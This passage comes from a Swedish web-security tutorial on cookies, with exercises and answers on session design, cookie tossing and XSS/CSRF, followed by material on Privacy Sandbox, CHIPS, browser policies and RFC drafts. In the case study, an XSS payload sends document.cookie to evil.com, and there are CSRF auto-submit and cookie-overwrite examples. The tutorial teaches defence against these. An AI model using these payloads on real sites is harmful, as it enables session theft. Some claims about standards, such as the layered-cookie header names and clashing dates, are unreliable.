3. Session timeout-strategi
4. CSRF-skydd
5. Hur du hanterar session-regenerering

<details>
<summary>📖 Visa facit</summary>

**Komplett design:**

**1. Sessions-cookie:**
```
Set-Cookie: __Host-session=<random-128-bit>;
            Path=/;
            HttpOnly;
            Secure;
            SameSite=Lax;
            Max-Age=3600
```

**Motivering:**
- `__Host-` prefix: Förhindrar subdomain attacks
- `HttpOnly`: Skydd mot XSS cookie theft
- `Secure`: Endast HTTPS
- `SameSite=Lax`: CSRF-skydd, men tillåter navigation från andra sajter
- `Max-Age=3600`: 1 timme (e-handel behöver inte extremt kort)

**2. "Kom ihåg mig"-cookie:**
```
Set-Cookie: remember_token=<random-256-bit-token>;
            Path=/;
            HttpOnly;
            Secure;
            SameSite=Lax;
            Max-Age=2592000
```

**Motivering:**
- Separat från session-cookie
- Längre Max-Age (30 dagar)
- Lagras hashat i databas serversidan
- Kan revokeras av användaren
- Vid användning: generera ny session + rotera remember-token

**3. Timeout-strategi:**

```javascript
// Idle timeout: 30 minuter
// Absolute timeout: 12 timmar

app.use((req, res, next) => {
  if (!req.session.userId) return next();

  const now = Date.now();

  // Idle: 30 min sedan senaste aktivitet
  if (now - req.session.lastActivity > 30 * 60 * 1000) {
    return req.session.destroy(() => {
      res.status(401).json({ error: 'Session expired (idle)' });
    });
  }

  // Absolute: 12 timmar sedan skapande
  if (now - req.session.createdAt > 12 * 60 * 60 * 1000) {
    return req.session.destroy(() => {
      res.status(401).json({ error: 'Session expired (time)' });
    });
  }

  req.session.lastActivity = now;
  next();
});
```

**4. CSRF-skydd:**

```javascript
// Lägg till SameSite=Lax på session-cookie (redan gjort ovan)

// PLUS: CSRF-tokens för state-changing requests
app.use((req, res, next) => {
  if (req.method === 'GET' && req.session) {
    req.session.csrfToken = crypto.randomBytes(32).toString('hex');
  }
  next();
});

// Validera på POST/PUT/DELETE
app.post('/checkout', (req, res) => {
  if (req.body.csrfToken !== req.session.csrfToken) {
    return res.status(403).json({ error: 'CSRF validation failed' });
  }
  // Process checkout...
});

// Frontend skickar token i formulär eller header
```

**5. Session-regenerering:**

```javascript
// Vid inloggning
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body.username, req.body.password);
  if (!user) return res.status(401).send('Invalid credentials');

  // REGENERERA session-ID
  req.session.regenerate((err) => {
    if (err) return res.status(500).send('Error');

    req.session.userId = user.id;
    req.session.createdAt = Date.now();
    req.session.lastActivity = Date.now();
    req.session.csrfToken = crypto.randomBytes(32).toString('hex');

    res.json({ success: true, csrfToken: req.session.csrfToken });
  });
});

// Vid utloggning
app.post('/logout', (req, res) => {
  req.session.destroy((err) => {
    res.clearCookie('__Host-session');
    res.json({ success: true });
  });
});

// Vid password-ändring
app.post('/change-password', async (req, res) => {
  // Verify old password, update to new password...

  // REGENERERA session efter password-ändring
  const userId = req.session.userId;
  req.session.regenerate((err) => {
    req.session.userId = userId;
    res.json({ success: true });
  });
});
```

**Extra säkerhetsåtgärder:**
- Rate limiting på login (max 5 försök per 15 min)
- Account lockout efter för många misslyckade försök
- Email-notifikation vid ny inloggning från okänd enhet
- Möjlighet att se och revokera aktiva sessioner
- 2FA (Two-Factor Authentication) som option

</details>

#### Övning 5: Cookie Tossing-attack

Givet denna setup:
- Huvudapp: `app.example.com`
- Blogg (sårbar): `blog.example.com`
- Cookie på huvudapp: `Set-Cookie: admin=false; Path=/`

Hur kan en angripare utnyttja bloggen för att eskalera privilegier på huvudappen?

<details>
<summary>📖 Visa facit</summary>

**Attack:**

1. **Angriparen komprometterar blog.example.com**
   - Via XSS, SQL injection, eller annan sårbarhet
   - Får möjlighet att sätta cookies

2. **Angriparen sätter en admin-cookie från bloggen:**
   ```javascript
   // Från blog.example.com
   document.cookie = "admin=true; Domain=.example.com; Path=/";
   ```

3. **Användaren har nu TVÅ admin-cookies:**
   ```
   admin=false  (från app.example.com)
   admin=true   (från blog.example.com med .example.com Domain)
   ```

4. **När användaren besöker app.example.com skickas båda:**
   ```
   Cookie: admin=false; admin=true
   ```

5. **Om huvudappen läser cookies osäkert:**
   ```javascript
   // SÅRBAR KOD
   const isAdmin = req.cookies.admin === 'true';
   // Om den tar SISTA värdet: admin=true → Privilegieeskalering!
   ```

**Försvar:**

**1. Använd `__Host-` prefix (BÄST):**
```
Set-Cookie: __Host-admin=false; Secure; Path=/; HttpOnly
```
- `__Host-` förhindrar Domain-attribut
- Cookie kan bara sättas från exakt domän
- Subdomäner kan INTE överskriva

**2. Signera cookies:**
```javascript
const crypto = require('crypto');

// Sätt cookie med signatur
function setSignedCookie(res, name, value) {
  const signature = crypto
    .createHmac('sha256', process.env.SECRET_KEY)
    .update(value)
    .digest('hex');

  res.cookie(name, value);
  res.cookie(name + '_sig', signature, { httpOnly: true });
}

// Validera cookie
function getSignedCookie(req, name) {
  const value = req.cookies[name];
  const signature = req.cookies[name + '_sig'];

  const expectedSig = crypto
    .createHmac('sha256', process.env.SECRET_KEY)
    .update(value)
    .digest('hex');

  if (signature !== expectedSig) {
    return null; // Ogiltig!
  }

  return value;
}

// Användning
const adminValue = getSignedCookie(req, 'admin');
if (adminValue === null) {
  // Cookie har manipulerats!
  return res.status(403).send('Invalid cookie');
}
```

**3. Isolera subdomäner:**
- Använd INTE samma Domain för olika säkerhetsnivåer
- Huvudapp: `app.example.com` (ingen Domain-attribut)
- Blogg: `blog.example.com` (egen cookie-scope)
- De kan inte påverka varandras cookies

**4. Validera alla cookies serversidan:**
```javascript
app.use((req, res, next) => {
  // Kontrollera att admin-värdet kommer från korrekt källa
  const adminCookie = req.cookies['__Host-admin'];

  if (adminCookie && !validateCookieIntegrity(adminCookie)) {
    res.clearCookie('__Host-admin');
    return res.status(403).send('Cookie integrity check failed');
  }

  next();
});
```

</details>

#### Övning 6: Case Study - Verklig attack

**Scenario:** En nyhetswebbplats med följande setup:
- Använder sessions-cookies för inloggning
- Har en kommentarsfunktion
- Tillåter användare att posta länkar i kommentarer

**Upptäckt sårbarhet:**
- Kommentarer escapas inte korrekt
- Sessions-cookies saknar `HttpOnly`
- Ingen CSRF-skydd på kritiska endpoints

**Frågor:**
1. Vilka attacker är möjliga?
2. Vad är worst-case scenario?
3. Hur skulle du fixa detta?
4. Prioritera fixarna (vad är mest kritiskt först)?

<details>
<summary>📖 Visa facit</summary>

**1. Möjliga attacker:**

**A) Stored XSS via kommentarer:**
```javascript
// Angripare postar kommentar:
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

// När andra läser kommentaren:
// - Skadlig script körs
// - Session-cookie stjäls (saknar HttpOnly!)
// - Angriparen kan logga in som offer
```

**B) CSRF för att posta skadliga kommentarer:**
```html
<!-- Angripare på evil.com -->
<form action="https://news-site.com/post-comment" method="POST">
  <input name="comment" value="<script>...</script>">
</form>
<script>document.forms[0].submit();</script>

// Om offret är inloggat på news-site.com:
// - CSRF postar kommentar
// - Kommentar innehåller XSS
// - Nu sprids XSS till alla läsare
```

**C) Account takeover-kedja:**
```
1. Angripare använder CSRF för att posta XSS-kommentar
2. XSS stjäl session-cookies från läsare
3. Angripare loggar in som läsare
4. Om läsare är admin → Angripare har admin-åtkomst
5. Angripare ändrar innehåll, stjäl data, etc.
```

**2. Worst-case scenario:**

```
1. Angripare postar XSS-kommentar (via CSRF eller manuellt)
2. Admin läser kommentaren
3. Admin's session-cookie stjäls
4. Angriparen loggar in som admin
5. Angriparen:
   - Ändrar artiklar med desinformation
   - Stjäl användardatabas (emails, personlig info)
   - Postar mer XSS som stjäl alla läsares cookies
   - Använder plattformen för phishing
   - Förstör webbplatsens reputation
```

**3. Hur fixa:**

**Fix 1: Lägg till HttpOnly på sessions-cookies (OMEDELBART!)**
```javascript
app.use(session({
  cookie: {
    httpOnly: true,  // ← KRITISKT
    secure: true,
    sameSite: 'lax'
  }
}));
```
- Stoppar XSS cookie theft
- Snabb fix, ingen kod-omstrukturering

**Fix 2: Escapea kommentars-output (OMEDELBART!)**
```javascript
const escapeHtml = require('escape-html');

// När kommentarer visas
app.get('/article/:id', async (req, res) => {
  const comments = await getComments(req.params.id);

  const safeComments = comments.map(c => ({
    ...c,
    content: escapeHtml(c.content)  // ← Escapea!
  }));

  res.render('article', { comments: safeComments });
});
```

**Fix 3: Implementera CSP (Content Security Policy)**
```javascript
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; object-src 'none';"
  );
  next();
});
```
- Blockerar inline scripts
- Extra försvarslager mot XSS

**Fix 4: Lägg till CSRF-skydd**
```javascript
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

// I formulär
<form method="POST">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
  ...
</form>
```

**Fix 5: Använd SameSite på cookies (redan i Fix 1)**
```javascript
cookie: {
  sameSite: 'lax'  // CSRF-skydd
}
```

**Fix 6: Input validation**
```javascript
// Validera och sanitera input innan lagring
const sanitizeHtml = require('sanitize-html');

app.post('/post-comment', async (req, res) => {
  const safeComment = sanitizeHtml(req.body.comment, {
    allowedTags: ['b', 'i', 'em', 'strong', 'a'],
    allowedAttributes: {
      'a': ['href']
    }
  });

  await saveComment(safeComment);
});
```

**4. Prioritering (mest kritiskt först):**

**🔥 KRITISKT (Gör NU - inom timmar):**
1. **HttpOnly på sessions-cookies**
   - Stoppar pågående cookie theft
   - 1 rad kod
   - Omedelbar effekt

2. **Escape kommentars-output**
   - Stoppar XSS från att köra
   - Snabb fix
   - Skyddar alla användare

**⚠️ HÖGT (Inom 1-2 dagar):**
3. **CSP header**
   - Extra lager mot XSS
   - Relativt enkelt
   - Kan kräva test av existerande scripts

4. **CSRF-tokens**
   - Stoppar automatiska attacker
   - Kräver lite mer implementation

**📋 MEDIUM (Inom 1 vecka):**
5. **Input sanitization**
   - Förhindrar lagring av skadlig data
   - Defense-in-depth
   - Kräver mer testning

6. **Rate limiting**
   - Begränsa antal kommentarer per minut
   - Gör mass-XSS svårare

**🔒 LÅNGSIKTIGT:**
7. **Security audit**
   - Hitta andra sårbarheter
   - Penetration testing
   - Code review

8. **Security training för dev-team**
   - Förhindra framtida sårbarheter
   - Säker kodning från start

</details>

### 📝 Sammanfattning

**Viktigaste lärdomarna från Nivå 4:**

**Huvudsakliga hot:**
- **XSS (Cross-Site Scripting)** → Kör skadlig JavaScript, stjäl cookies
- **CSRF (Cross-Site Request Forgery)** → Utför obehöriga actions
- **Session Hijacking** → Stjäl eller gissa session-IDs
- **Session Fixation** → Fixera session-ID innan autentisering
- **Cookie Tossing** → Överskriva cookies från subdomäner

**Kritiska försvar:**
- **HttpOnly** → Skydd mot XSS cookie theft (ALLTID för sessions)
- **Secure** → Kräv HTTPS (ALLTID i produktion)
- **SameSite=Lax/Strict** → Skydd mot CSRF (Standard i moderna browsers)
- **__Host- prefix** → Skydd mot subdomain attacks
- **CSRF-tokens** → Extra CSRF-skydd för state-changing requests
- **Session-regenerering** → Förhindra session fixation
- **Kryptografiskt säkra session-IDs** → Minst 128 bitar CSPRNG
- **Input validation & output encoding** → Förhindra XSS
- **Timeouts** → Idle och absolute timeouts
- **HTTPS everywhere** → Kryptera all trafik

**Defense-in-Depth princip:**
Använd FLERA lager av försvar. Om ett lager bryts ska andra fortfarande skydda.

**OWASP Top 10 (2024) relaterat till cookies:**
1. Broken Access Control → Session hijacking
2. Cryptographic Failures → Svaga session-IDs, HTTP istället för HTTPS
3. Injection → XSS som stjäl cookies
4. Security Misconfiguration → Saknade cookie-attribut
5. Vulnerable Components → Gamla session-bibliotek

**Nya termer du lärt dig:**

- **XSS (Cross-Site Scripting)** – Injektera och köra skadlig JavaScript
- **CSRF (Cross-Site Request Forgery)** – Obehöriga cross-site requests
- **Session Hijacking** – Stjäla användares session
- **Session Fixation** – Fixera session-ID innan autentisering
- **Session Sniffing** – Avlyssna session-cookies på nätverket
- **Cookie Tossing** – Överskriva cookies från subdomäner
- **CSPRNG** – Cryptographically Secure Pseudorandom Number Generator
- **Defense-in-Depth** – Flera lager av säkerhetsförsvar
- **CIA-triad** – Confidentiality, Integrity, Availability
- **CSRF Token** – Unikt token för att förhindra CSRF
- **CSP (Content Security Policy)** – Header som begränsar vad som kan köras
- **HSTS (HTTP Strict Transport Security)** – Tvingar HTTPS
- **__Host- prefix** – Cookie-prefix som kräver Secure, Path=/, ingen Domain
- **__Secure- prefix** – Cookie-prefix som kräver Secure
- **Idle Timeout** – Timeout vid inaktivitet
- **Absolute Timeout** – Maximal total session-längd

**Nästa steg:**

Nu när du behärskar sårbarheter och försvar är det dags för den ultimata nivån! I Nivå 5 ska vi utforska moderna standarder, avancerade arkitekturer, cutting-edge teknologier (2024-2025), och hur cookies förhåller sig till alternativa lösningar. Vi går in på expertnivå med real-world case studies och enterprise-level design!

---

## Nivå 5: "Expert" – Modern utveckling, standarder & avancerade tekniker 💼

**Förkunskaper:** Nivå 1-4 (omfattande säkerhetskunskap)
**Läsningstid:** 20-30 minuter
**Målgrupp:** Erfarna utvecklare, säkerhetsexperter, systemarkitekter
**Nivå:** Expert

### 5.1 Introduktion: Cookie-landskapet 2024-2025

Välkommen till expertnivån! I detta avslutande kapitel gör vi en djupdykning i den snabbt föränderliga cookie-världen. Åren 2024-2025 har varit revolutionerande – vi har sett Googles Privacy Sandbox kollapsa, third-party cookies både försvinna och återkomma, nya RFC-standarder, och en fundamental omvärdering av hur vi ska hantera webbens tillstånd framåt.

**Vad gör detta kapitel unikt?**

Detta är inte bara teori – vi kommer att:
- Analysera vad som hände med Privacy Sandbox och varför Google backade
- Förstå CHIPS (partitioned cookies) och dess framtid
- Jämföra cookies med moderna alternativ (JWT, sessions, OAuth)
- Designa enterprise-level autentiseringssystem
- Studera verkliga security breaches och deras lärdomar
- Utforska de senaste RFC-standarderna (6265bis och layered cookies)
- Bygga production-ready lösningar för 2025 och framåt

**Viktiga händelser 2024-2025:**

```
Timeline: The Cookie Wars 2024-2025
═══════════════════════════════════════════════════════════════

2020-01        Google announces third-party cookie phase-out
│              (Planned for 2022, later delayed multiple times)
│
2024-01        Chrome disables cookies for 1% of users (30M)
│              "Testing begins"
│
2024-04        CMA (UK Competition Authority) orders pause
│              Concerns about market monopolization
│
2024-07 ⚠️     BOMBSHELL: Google abandons complete phase-out
│              Introduces "user choice" model instead
│              Industry: "We told you so"
│
2024-10        Privacy Sandbox APIs officially deprecated
│              Most APIs retired due to poor adoption
│              CHIPS, FedCM, Private State Tokens survive
│
2025-03        RFC 6265bis draft-20 published
│              Updated cookie standard
│
2025-04        Google confirms: No separate cookie consent UI
│              Users manage via existing Privacy Settings
│
2025-05        RFC layered-cookies draft-00 published
│              Potential next-gen cookie architecture
│
2025-NOW       Safari: Blocks 3rd-party cookies (since 2017)
               Firefox: Blocks 3rd-party cookies (since 2019)
               Chrome: "User choice" for 3rd-party cookies
```

**Vad betyder detta för dig som utvecklare?**

1. **Third-party cookies lever vidare** – åtminstone i Chrome med user opt-in
2. **Safari och Firefox kör sin egen linje** – total blockering sedan länge
3. **Fragmentering** – olika browsers, olika policies
4. **CHIPS är framtiden** för legitimate third-party use cases
5. **Alternativa lösningar** blir allt viktigare

Låt oss börja!

---

### 5.2 Privacy Sandbox: Uppgång och fall

#### 5.2.1 Vad var Privacy Sandbox?

Privacy Sandbox var Googles ambitiösa initiativ (lanserat 2019) för att ersätta third-party cookies med "privacy-preserving" APIs. Målet var att:

- Eliminera cross-site tracking
- Bevara relevant annonsering (Googles huvudintäkt)
- Ge användare mer kontroll
- Sätta en ny standard för webben

**De viktigaste API:erna:**

| API | Syfte | Status 2025 |
|-----|-------|-------------|
| **Topics API** | Interest-based ads utan tracking | ❌ Deprecated |
| **FLEDGE/Protected Audience** | Remarketing utan cookies | ❌ Deprecated |
| **Attribution Reporting** | Konverteringsmätning | ❌ Deprecated |
| **CHIPS** | Partitioned cookies | ✅ **Survivor** |
| **FedCM** | Federated identity | ✅ **Survivor** |
| **Private State Tokens** | Anti-fraud | ✅ **Survivor** |
| **Shared Storage** | Cross-site data | ❌ Deprecated |

#### 5.2.2 Varför kollapsade Privacy Sandbox?

I oktober 2025 tillkännagav Google att de flesta Privacy Sandbox APIs retireras. Varför?

**1. Poor Adoption (Dåligt mottagande)**

```javascript
// Detta skulle ersätta third-party cookies:
if ('browsingTopics' in document) {
  const topics = await document.browsingTopics();
  // Topics = ["sports", "technology", "cooking"]
  // Istället för individuell tracking
}

// Verkligheten:
// - Komplicerat API
// - Svårt att integrera
// - Utvecklare föredrog klassiska cookies
// - Ad tech-industrin motstånd: "För begränsat"
```

**2. Regulatoriska problem**

- UK Competition and Markets Authority (CMA) orolig för Googles monopol
- "Google får både äta kakan och ha den kvar" – kontrollerar både browser OCH ad platform
- Tvingade Google att pausa i april 2024

**3. Industry Pushback**

- Publishers: "Vi förlorar intäkter!"
- Advertisers: "Targeting blir värdelöst!"
- Ad tech: "Detta gynnar bara Google!"

**4. Teknisk komplexitet**

Privacy Sandbox introducerade 10+ nya APIs. Utvecklare: "Varför inte bara... cookies?"

#### 5.2.3 CHIPS – Den enda överlevaren som spelar roll

**CHIPS (Cookies Having Independent Partitioned State)** är den viktigaste teknologin som överlever Privacy Sandbox-kollapsen.

**Vad är CHIPS?**

Istället för att blocka third-party cookies helt, partitioneras de per top-level site:

```
Traditional Third-Party Cookie:
════════════════════════════════

User visits:    example.com   →  Sets cookie: tracker.com=abc123
User visits:    shop.com      →  Reads cookie: tracker.com=abc123
                                  ❌ Cross-site tracking!


CHIPS Partitioned Cookie:
═════════════════════════

User visits:    example.com   →  Sets partitioned cookie:
                                  tracker.com=abc123 (partition: example.com)

User visits:    shop.com      →  Sets partitioned cookie:
                                  tracker.com=xyz789 (partition: shop.com)
                                  ✅ Different cookies! No tracking!
```

**Hur använder man CHIPS?**

```javascript
// Server-side: Sätt partitioned cookie
Set-Cookie: session=abc123;
            SameSite=None;
            Secure;
            Partitioned

// Observera: SameSite=None krävs för third-party context
// men Partitioned gör den safe!
```

**Use Cases för CHIPS:**

1. **Embedded chat widgets** – separat session per site
2. **Payment providers** – behåller state under checkout
3. **CDN services** – load balancing per origin
4. **Federated SSO widgets** – separat auth per site

**Browser Support 2025:**

- ✅ Chrome 115+ (2023)
- ✅ Edge 115+ (2023)
- ⏳ Safari (under evaluation)
- ⏳ Firefox (under discussion)

**Praktiskt exempel:**

```html
<!-- iframe från payment-provider.com embedded på shop.com -->
<iframe src="https://payment-provider.com/checkout"></iframe>

<!-- På payment-provider.com: -->
<script>
// Sätt partitioned cookie för shopping cart
fetch('/api/cart/add', {
  method: 'POST',
  credentials: 'include', // Skicka cookies
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ item: 'laptop' })
});

// Server response:
// Set-Cookie: cart_id=xyz; Partitioned; Secure; SameSite=None; Path=/
</script>
```

När samma payment-provider embedas på `different-shop.com`, får den en helt ny `cart_id` – ingen cross-site tracking möjlig!

**🎯 Pro-Tips för CHIPS:**

1. **Använd Partitioned för legitimate third-party needs** – inte för tracking
2. **Kombinera med __Host- prefix** för max security:
   ```
   Set-Cookie: __Host-session=abc; Partitioned; Secure; Path=/; SameSite=None
   ```
3. **Testa fallback** – äldre browsers stödjer inte Partitioned
4. **Dokumentera partitioning strategy** – olika cookies per top-level domain

---

### 5.3 Browser-kriget: Safari vs Firefox vs Chrome

Olika browsers har radikalt olika approaches till cookies 2024-2025.

#### 5.3.1 Safari – Den strikta

**Timeline:**
- **2017:** Intelligent Tracking Prevention (ITP) 1.0 lanseras
- **2020:** ITP 2.3 – blockar ALL third-party cookies by default
- **2024-2025:** Ingen förändring – total blockering kvarstår

**Hur fungerar ITP?**

```javascript
// Safari's approach:

1. Machine learning identifierar "trackers"
2. Third-party cookies blockeras HELT
3. First-party cookies från "tracking domains"
   får 7-dagars lifetime (om satta via JavaScript)
4. LocalStorage från trackers rensas efter 7 dagar

// Example:
// analytics.com sets cookie on yoursite.com
document.cookie = "tracker=123"; // ❌ Blocked by ITP

// yoursite.com sets own cookie
document.cookie = "session=abc"; // ✅ OK (first-party)
```

**Workarounds som INTE fungerar längre:**

```javascript
// ❌ CNAME cloaking (blockerat 2021)
// tracker.com → stats.yoursite.com (CNAME)
// ITP detekterar och blockerar

// ❌ Link decoration (?fbclid=...)
// ITP strips tracking parameters

// ❌ Bounce tracking
// redirect via tracker.com → yoursite.com
// ITP detects and blocks
```

**Vad fungerar i Safari?**

✅ First-party cookies (från same-site)
✅ CHIPS (under consideration, men conceptuellt compatible)
✅ Server-side session management
✅ Authentication cookies (first-party)

#### 5.3.2 Firefox – Privacy by Default

**Timeline:**
- **2019:** Enhanced Tracking Protection (ETP) – standard mode
- **2019:** Strict mode option (total blocking)
- **2024-2025:** Fortsatt blockering av known trackers

**Firefox approach:**

```javascript
// Firefox använder en BLOCKLIST:

1. Disconnect.me's tracking protection list
2. Cookies från kända trackers blockeras
3. Cryptominers blockeras
4. Fingerprinting scripts blockeras

// Exempel:
// doubleclick.net → ❌ Blocked (known tracker)
// youranalytics.com → ✅ OK (unknown domain)

// MEN: User kan välja "Strict" mode:
// ALL third-party cookies → ❌ Blocked
```

**Total Cookie Protection (2021+):**

Firefox introducerade "Total Cookie Protection" – similar till CHIPS:

```
Total Cookie Protection = Dynamic First Party Isolation

website-a.com uses embed-x.com → Cookie jar A
website-b.com uses embed-x.com → Cookie jar B

Separate jars = No tracking!
```

#### 5.3.3 Chrome – The Great U-Turn

**Timeline:**
- **2020:** "We will phase out third-party cookies"
- **2024 Jan:** Disables for 1% (30M users)
- **2024 July:** **"Just kidding! User choice instead"**
- **2025 April:** Confirmed – cookies stay, user can disable

**Chrome's "User Choice" model:**

```javascript
// Instead of blocking, Chrome adds:
// Settings → Privacy and Security → Third-party cookies
//
// Options:
// [ ] Allow third-party cookies
// [x] Block third-party cookies
// [ ] Block third-party cookies in Incognito

// Default: ALLOW (unlike Safari/Firefox)
```

**Varför backade Google?**

1. **Ekonomiska realiteter** – 80% av Googles intäkt = ads
2. **Industry pressure** – advertisers hotade med antitrust suits
3. **Regulatory concerns** – CMA oroad för Googles monopol
4. **Technical debt** – Privacy Sandbox failed to deliver
5. **Competitive pressure** – Safari/Firefox tog olika väg ändå

**Vad betyder detta för utvecklare?**

```javascript
// 2025 Reality Check:

const browserSupport = {
  chrome: {
    thirdPartyCookies: 'ALLOWED_BY_DEFAULT', // User can disable
    chips: 'SUPPORTED',
    privateSandbox: 'DEPRECATED'
  },
  safari: {
    thirdPartyCookies: 'BLOCKED', // No user option
    chips: 'UNDER_CONSIDERATION',
    itp: 'ACTIVE'
  },
  firefox: {
    thirdPartyCookies: 'BLOCKED_IF_TRACKER', // Blocklist
    chips: 'UNDER_CONSIDERATION',
    etp: 'ACTIVE'
  }
};

// Your strategy:
// 1. Assume third-party cookies MAY be blocked
// 2. Use first-party cookies when possible
// 3. Use CHIPS for legitimate third-party needs
// 4. Have server-side fallback
```

**🎯 Cross-browser strategy 2025:**

```javascript
// Feature detection + graceful degradation

async function setTrackingCookie() {
  // Try modern approach (CHIPS)
  document.cookie = 'data=xyz; Partitioned; Secure; SameSite=None';

  // Check if it worked
  if (!document.cookie.includes('data=xyz')) {
    // Fallback: Server-side session
    await fetch('/api/session/create', {
      method: 'POST',
      credentials: 'include'
    });
  }
}

// Feature flags per browser
const features = {
  supportsPartitioned: 'Partitioned' in CookieStore?.prototype || isChrome115Plus(),
  supportsThirdParty: await testThirdPartyCookie(),
  supportsSameSiteNone: true // All modern browsers
};
```

---

### 5.4 RFC Standarder: 6265bis och Layered Cookies

HTTP cookies definieras av IETF RFC standards. Under 2024-2025 har vi sett betydande uppdateringar.

#### 5.4.1 RFC 6265 – Den ursprungliga standarden (2011)

Publicerad april 2011, definierade:
- `Set-Cookie` och `Cookie` headers
- Cookie attributes: Domain, Path, Expires, Max-Age, Secure, HttpOnly
- Cookie jar management

**Problem med RFC 6265:**

```javascript
// 1. SameSite saknades (adderat 2016)
Set-Cookie: session=abc
// ^ Sårbar för CSRF!

// 2. __Host- och __Secure- prefixes saknades
Set-Cookie: session=abc; Secure
// ^ Kan overridas från subdomain!

// 3. Cookie prioritization unclear
Set-Cookie: session=abc  // Which one wins?
Set-Cookie: session=xyz  // Not specified!

// 4. Third-party context undefined
// iframe scenarios ej tydligt specade
```

#### 5.4.2 RFC 6265bis – Moderniseringen (2024-2025)

**draft-ietf-httpbis-rfc6265bis-20** (Mars 2025) – Latest version.

**Nytt i 6265bis:**

**1. SameSite attribute (officiellt standardiserat)**

```http
Set-Cookie: session=abc; SameSite=Strict
Set-Cookie: tracking=xyz; SameSite=Lax
Set-Cookie: payment=123; SameSite=None; Secure
```

**2. Cookie Prefixes**

```http
Set-Cookie: __Secure-token=abc; Secure; Path=/
Set-Cookie: __Host-session=xyz; Secure; Path=/
```

Formellt requirement i spec:
- `__Secure-` → MUST have Secure
- `__Host-` → MUST have Secure, Path=/, NO Domain

**3. Tydligare Cookie Eviction Rules**

När cookie jar är full (typ 50-180 cookies per domain):

```
Priority (högst→lägst):
1. Persistent cookies med långt Expires/Max-Age
2. Persistent cookies med kort Expires/Max-Age
3. Session cookies (no Expires/Max-Age)

Within same priority:
- Least Recently Used (LRU) evicted first
```

**4. Förbättrad Third-Party Handling**

Spec definierar exakt när cookie är "third-party":

```javascript
// Top-level: https://example.com
// Embedded iframe: https://cdn.example.com/widget

// Same-site? YES (same registrable domain)
// → First-party cookie context

// Embedded iframe: https://different.com/widget
// Same-site? NO
// → Third-party cookie context
```

**5. Schemeful Same-Site**

```javascript
// Old behavior:
http://example.com + https://example.com = Same-Site ✅

// RFC 6265bis (Schemeful Same-Site):
http://example.com + https://example.com = CROSS-Site ❌

// Prevents downgrade attacks:
// Attacker serves http://example.com (no HTTPS)
// Tries to steal https://example.com cookies
// → Blocked!
```

**6. Cookie Size Limits (Clarified)**

```javascript
Limits (SHOULD enforce):
- Maximum cookie size: 4096 bytes (name + value + attributes)
- Maximum cookies per domain: 50
- Maximum total cookies: 3000

// Browsers MAY enforce stricter limits
// Chrome: ~180 per domain
// Firefox: ~150 per domain
// Safari: ~600 per domain
```

---
#### 5.4.3 Layered Cookies – Framtidens arkitektur? (2025)

**draft-ietf-httpbis-layered-cookies-00** (Maj 2025) – Brand new!

Detta är ett REVOLUTIONÄRT förslag som kan ersätta både 6265 och 6265bis.

**Vad är "Layered Cookies"?**

Idén: Separera cookies i explicita layers baserat på use-case:

```http
Layer 1: Authentication Cookies
  Set-Cookie-Auth: session=abc; Secure; HttpOnly; SameSite=Strict

Layer 2: Preference Cookies
  Set-Cookie-Pref: theme=dark; Max-Age=31536000

Layer 3: Analytics Cookies
  Set-Cookie-Analytics: visitor=xyz; Partitioned; SameSite=None; Secure

Layer 4: Advertising Cookies
  Set-Cookie-Ads: campaign=123; Partitioned; SameSite=None; Secure; Max-Age=86400
```

**Fördelar:**

1. **User Control** – Kan blocka "Ads" layer men tillåta "Auth" layer
2. **Browser UX** – Tydligare cookie-inställningar per layer
3. **Regulatory Compliance** – GDPR "necessary" vs "optional" cookies explicit
4. **Developer Clarity** – Clear separation of concerns

**Hur skulle det fungera?**

```javascript
// Server-side (Node.js example):
res.setHeader('Set-Cookie-Auth',
  'session=abc; Secure; HttpOnly; SameSite=Strict; Path=/');

res.setHeader('Set-Cookie-Pref',
  'lang=sv; Max-Age=31536000; SameSite=Lax');

res.setHeader('Set-Cookie-Analytics',
  'visitor=xyz; Partitioned; Secure; SameSite=None; Max-Age=31536000');

// Client-side:
// Browser automatically categorizes:
// 🔒 Authentication: 1 cookie
// ⚙️  Preferences: 1 cookie
// 📊 Analytics: 1 cookie
```

**Status:** Early draft. Implementation osäker. Skulle kräva:
- Ändring i ALL browser-kod
- Bakåtkompatibilitet med gamla cookies
- Developer adoption

**Realistisk timeline:** 2027-2028 tidigast, IF det blir standard.

---

### 5.5 Cookies vs Alternativ: JWT, Sessions, OAuth

En av de viktigaste frågorna 2025: **Ska vi ens använda cookies?**

Låt oss göra en djup jämförelse.

#### 5.5.1 Traditional Session Cookies

**Hur det fungerar:**

```javascript
// 1. User loggar in
POST /login
{ "username": "alice", "password": "secret" }

// 2. Server skapar session
const sessionId = crypto.randomUUID();
sessions[sessionId] = { userId: 'alice', role: 'admin' };

// 3. Server skickar session cookie
Set-Cookie: sessionId=abc-123; HttpOnly; Secure; SameSite=Strict; Path=/

// 4. Varje request inkluderar cookie
GET /api/profile
Cookie: sessionId=abc-123

// 5. Server lookups session
const session = sessions['abc-123']; // { userId: 'alice', role: 'admin' }
```

**Architecture:**

```
Client                          Server                    Session Store
  │                               │                             │
  │─────── Login ────────────────>│                             │
  │                               │─── Create Session ─────────>│
  │                               │<──── Session ID ────────────│
  │<──── Set-Cookie ──────────────│                             │
  │                               │                             │
  │─────── Request ──────────────>│                             │
  │     (Cookie: sessionId)       │──── Lookup Session ────────>│
  │                               │<──── Session Data ──────────│
  │<──── Response ────────────────│                             │
```

**Fördelar:**

✅ **Instant revocation** – Delete session = user logged out
✅ **Server control** – All state på server
✅ **Small cookie size** – Bara ett ID
✅ **CSRF-protected** (med SameSite)
✅ **HttpOnly-protected** – XSS kan inte stjäla

**Nackdelar:**

❌ **Scalability** – Behöver shared session store (Redis, etc)
❌ **Server overhead** – DB lookup varje request
❌ **Cross-domain** – Cookies funkar inte cross-domain
❌ **Mobile apps** – Cookies awkward i native apps

**Best Use Cases:**

- Traditional web apps (server-rendered)
- High-security apps (banking, healthcare)
- Apps där instant logout är kritiskt

#### 5.5.2 JWT (JSON Web Tokens)

**Hur det fungerar:**

```javascript
// 1. User loggar in
POST /login
{ "username": "alice", "password": "secret" }

// 2. Server skapar JWT
const jwt = require('jsonwebtoken');
const token = jwt.sign(
  { userId: 'alice', role: 'admin' },  // Payload
